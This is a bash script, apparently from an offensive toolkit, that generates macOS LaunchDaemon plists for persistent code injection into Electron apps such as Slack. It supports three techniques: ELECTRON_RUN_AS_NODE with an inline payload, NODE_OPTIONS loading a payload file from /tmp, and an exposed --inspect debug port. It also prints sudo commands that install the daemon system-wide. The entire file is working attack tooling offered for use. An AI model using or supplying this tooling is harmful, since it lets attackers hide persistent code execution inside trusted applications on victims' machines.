#!/bin/bash
# Create a LaunchDaemon plist for Electron injection persistence
# Usage: ./create-launchdaemon.sh /Applications/Slack.app "YOUR_PAYLOAD" [technique]
# Techniques: runasnode, nodeoptions, inspect

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 /path/to/app.app ""payload"" [technique]"
    echo "Techniques: runasnode, nodeoptions, inspect"
    echo ""
    echo "Example: $0 /Applications/Slack.app ""require('child_process').execSync('whoami')"" runasnode"
    exit 1
fi

APP_PATH="$1"
PAYLOAD="$2"
TECHNIQUE="${3:-runasnode}"
LABEL="com.electron.inject.$(date +%s)"
PLIST_FILE="/tmp/${LABEL}.plist"

echo "=== Creating LaunchDaemon for $APP_PATH ==="
echo "Technique: $TECHNIQUE"
echo "Label: $LABEL"
echo ""

case $TECHNIQUE in
    runasnode)
        cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LABEL</string>
    <key>ProgramArguments</key>
    <array>
        <string>$APP_PATH/Contents/MacOS/$(basename "$APP_PATH" .app)</string>
        <string>-e</string>
        <string>$PAYLOAD</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>ELECTRON_RUN_AS_NODE</key>
        <string>true</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
        ;;
    nodeoptions)
        PAYLOAD_FILE="/tmp/electron-payload-$(date +%s).js"
        echo "$PAYLOAD" > "$PAYLOAD_FILE"
        
        cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LABEL</string>
    <key>ProgramArguments</key>
    <array>
        <string>$APP_PATH/Contents/MacOS/$(basename "$APP_PATH" .app)</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>ELECTRON_RUN_AS_NODE</key>
        <string>true</string>
        <key>NODE_OPTIONS</key>
        <string>--require $PAYLOAD_FILE</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
        echo "Payload file created: $PAYLOAD_FILE"
        ;;
    inspect)
        cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$LABEL</string>
    <key>ProgramArguments</key>
    <array>
        <string>$APP_PATH/Contents/MacOS/$(basename "$APP_PATH" .app)</string>
        <string>--inspect=9229</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF
        echo "Debug port: 9229"
        echo "Connect via chrome://inspect"
        ;;
    *)
        echo "Unknown technique: $TECHNIQUE"
        echo "Valid techniques: runasnode, nodeoptions, inspect"
        exit 1
        ;;
esac

echo ""
echo "Plist created: $PLIST_FILE"
echo ""
echo "To install (requires sudo for system-wide):"
echo "  cp $PLIST_FILE ~/Library/LaunchDaemons/"
echo "  launchctl load ~/Library/LaunchDaemons/$LABEL.plist"
echo ""
echo "Or for system-wide (requires sudo):"
echo "  sudo cp $PLIST_FILE /Library/LaunchDaemons/"
echo "  sudo launchctl load /Library/LaunchDaemons/$LABEL.plist"
